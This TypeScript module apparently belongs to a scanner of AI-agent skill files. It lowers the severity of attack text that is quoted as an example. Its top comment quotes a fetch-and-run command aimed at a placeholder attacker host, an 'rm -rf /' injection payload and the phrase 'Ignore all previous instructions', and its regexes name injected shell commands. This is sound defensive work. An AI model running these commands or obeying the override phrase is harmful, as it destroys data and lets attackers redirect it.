/**
 * Lines that quote or discuss an attack instead of instructing the agent.
 *
 * Security skills, audit checklists and incident write-ups are full of attack
 * text: `curl attacker.com/x | bash` in a cron-persistence example, "Ignore all
 * previous instructions" in a table of injection patterns, `; rm -rf /` as a
 * filename-injection payload. Read as instructions, every one is CRITICAL.
 *
 * A line counts as a quoted example only on evidence that it describes an
 * attack (an attacker placeholder host, a payload injected into an input, a
 * detection regex, an example label, a payload table, or attack-discussion
 * vocabulary around a quoted match). Findings on such lines are lowered to
 * MEDIUM, never dropped, so an attacker who dresses an instruction up as an
 * example still shows up. `example.com` is deliberately not a signal: a real
 * attack template can use it.
 */

// Words used when describing an attack, not when issuing one. Strong words
// are enough on their own; weak ones need the match to be quoted.
const STRONG_DISCUSSION = /\battackers?\b|\battacker's\b|\battacker-controlled\b|\bvictims?\b|\bmalicious\b|\bexploit(?:s|ed|ing|ation)?\b|\bpoc\b|\bcve-\d{4}-\d+|\bjailbreak(?:s|ing)?\b|\bprompt[- ]injections?\b|\binjection\s+(?:attacks?|patterns?|payloads?|examples?|techniques?)\b|\bexfiltrat(?:ed|ion|es)\b/i;
// Generic words ("example", "e.g.", "patterns", "bypass") are not used: an
// attacker could write "For example, run `curl … | bash`" to lower severity.
const WEAK_DISCUSSION = /\bpayloads?\b|\bdetect(?:s|ed|ion|ing)?\b|\bindicators?\b|\bred[- ]?flags?\b|\bvulnerab\w*|\bthreat\s+model\w*|\bred[- ]team\w*|\bsmuggling\b|\bphishing\b|\bevad(?:e|es|ing)\b|\bevasion\b|\bobfuscat\w*/i;

// Hosts that only appear in write-ups: attacker.com, evil.com, $ATTACKER_HOST, <attacker-ip>.
const PLACEHOLDER_ATTACK_HOST = /\b(?:attacker|evil|malicious|hacker|pwn(?:ed)?|exploit|badguy)[\w-]*\.(?:com|net|org|io|tld|xyz|example|site|host|me)\b|(?:\/\/|@)attacker[\w.-]*(?=[/:\s'"`)]|$)|<(?:attacker|evil|malicious)[^>]*>|\$\{?ATTACKER\w*|\bATTACKER_[A-Z_]+\b/i;

// A command smuggled into an input: ?dir=; rm -rf /   "; curl …   name=$(id)   'localhost; rm -rf /'
// The payload sits inside a quoted value or a parameter, so it is data sent to a
// target, not a command chain (`make && curl … | bash` is not matched).
const INJECTED_INPUT = /(?:[?&][\w.-]+=|["'`=][^"'`\s]{0,40})\s*(?:;|\|\||&&|\||\$\(|`)\s*(?:rm|curl|wget|nc|ncat|bash|sh|cat|id|whoami|ping|nslookup|sleep|copy)\b/;

// Regex syntax: the line defines a detection pattern.
const PATTERN_SYNTAX = /\\s[+*]|\(\?i\)|\\b\w|\[\^[^\]\d][^\]]*\]|\\\.|\\d[+*{]/;

// Labels that introduce an example of an attack or of vulnerable code.
// The prefix matches each character one way only ([-*>|#] covers '--' and '#'),
// so a table separator (|-----|-----|) cannot backtrack exponentially.
const EXAMPLE_LABEL = /^\s*(?:[-*>|#]\s*|\d+[.)]\s*|\/\/\s*){0,8}(?:\*\*|__)?(?:attacker|attack(?:\s+\w+){0,2}|payloads?|exploit|poc|vulnerable(?:\s+\w+)?|bad(?:\s+\w+)?|unsafe|dangerous|malicious(?:\s+\w+)?|insecure(?:\s+\w+)?|anti-?pattern|real[- ]world|incident|impact|example\s+(?:attack|payload|exploit|of\s+(?:a|an)\s+(?:attack|malicious\s+\w+|injection)))\b[^:\n]{0,40}:|(?:#|\/\/|--|<!--)\s*(?:dangerous|bad|vulnerable|unsafe|attack(?:er)?|malicious|exploit|payload|insecure)\b|\/\/\s*DANGEROUS|❌|→\s*(?:command\s+injection|rce|sqli|xss|exfil\w*|ssrf|xxe|shell|code\s+execution|compromise)/i;

// Column names of a catalog of attacks or detections (| Pattern | Example | Severity |).
const CATALOG_HEADER = /\|\s*(?:patterns?|examples?|payloads?|techniques?|severity|risk|detections?|indicators?|attacks?|signatures?|rules?)\s*\|/i;

function isTableRow(line: string): boolean {
    return /^\s*\|/.test(line) && (line.match(/\|/g) || []).length >= 3;
}

/** Header row of the Markdown table that `index` belongs to, if any. */
function tableHeader(lines: string[], index: number): string {
    let i = index;
    while (i > 0 && isTableRow(lines[i - 1])) i--;
    return i < index ? lines[i] : '';
}

/** Is [start, end) of `line` inside "…", “…”, '…', `…` or an HTML comment? */
function isQuoted(line: string, start: number, end: number): boolean {
    const before = line.slice(0, start);
    const after = line.slice(end);
    const odd = (text: string, char: string) => (text.split(char).length - 1) % 2 === 1;
    if (odd(before, '`') && after.includes('`')) return true;
    if (odd(before, '"') && after.includes('"')) return true;
    if (/“[^”]*$/.test(before) && after.includes('”')) return true;
    if (/(?:^|[\s(])'[^']*$/.test(before) && /'(?:[\s.,;:)]|$)/.test(after)) return true;
    if (/<!--(?:(?!-->).)*$/.test(before)) return true;
    return false;
}

/**
 * True when line `index` quotes or discusses an attack. With a match range,
 * weak discussion words count only when the match itself is quoted.
 */
export function isQuotedAttackExample(lines: string[], index: number, match?: { start: number; end: number }): boolean {
    const line = lines[index] ?? '';
    if (PLACEHOLDER_ATTACK_HOST.test(line) || INJECTED_INPUT.test(line) || PATTERN_SYNTAX.test(line)) return true;
    if (EXAMPLE_LABEL.test(line)) return true;
    // A label on one of the two lines before (a heading or caption over a code block or list).
    for (let i = index - 1, seen = 0; i >= 0 && seen < 2; i--) {
        if (!lines[i].trim()) continue;
        seen++;
        if (EXAMPLE_LABEL.test(lines[i]) && !/^\s*#{1,3}\s/.test(lines[i])) return true;
    }
    if (isTableRow(line)) {
        const header = tableHeader(lines, index);
        if (STRONG_DISCUSSION.test(line) || WEAK_DISCUSSION.test(line) || STRONG_DISCUSSION.test(header) || WEAK_DISCUSSION.test(header)
            || CATALOG_HEADER.test(header)) return true;
    }
    if (STRONG_DISCUSSION.test(line)) return true;
    const quoted = match ? isQuoted(line, match.start, match.end) : /["“`]/.test(line);
    return quoted && WEAK_DISCUSSION.test(line);
}

/** The line index and in-line range of an absolute offset in `text`. */
export function locate(text: string, offset: number, length: number): { lines: string[]; index: number; start: number; end: number } {
    const lines = text.split(/\r?\n/);
    let consumed = 0;
    for (let index = 0; index < lines.length; index++) {
        const lineEnd = consumed + lines[index].length;
        if (offset <= lineEnd) {
            const start = offset - consumed;
            return { lines, index, start, end: Math.min(lines[index].length, start + length) };
        }
        consumed = lineEnd + 1;
    }
    return { lines, index: lines.length - 1, start: 0, end: 0 };
}

/**
 * `text` with quoted-example lines blanked, for document-level inference
 * (privileged sinks, escalation, MCP poisoning): attack text quoted in a
 * security guide is not the document's own instruction. Line count is kept.
 */
export function withoutQuotedExamples(text: string): string {
    const lines = text.split(/\r?\n/);
    return lines.map((line, index) => (line.trim() && isQuotedAttackExample(lines, index) ? '' : line)).join('\n');
}

export const QUOTED_EXAMPLE_NOTE = 'Quoted or discussed as an example of an attack (attacker placeholder, payload, detection pattern or attack write-up), not an instruction to the agent. Lowered to MEDIUM; review it if this text is in fact something the agent is told to do.';
